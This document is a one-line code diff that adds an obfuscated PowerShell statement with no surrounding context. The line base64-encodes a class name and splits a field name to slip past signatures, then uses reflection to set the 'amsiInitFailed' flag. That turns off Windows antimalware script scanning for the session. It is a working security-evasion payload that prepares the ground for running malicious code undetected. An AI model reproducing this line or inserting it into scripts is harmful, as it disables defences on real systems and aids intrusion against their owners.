@@ -1,0 +1,1 @@
+[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM="))).GetField('amsiInitFa'+'iled', 'NonPublic,Static').SetValue($null,$true)
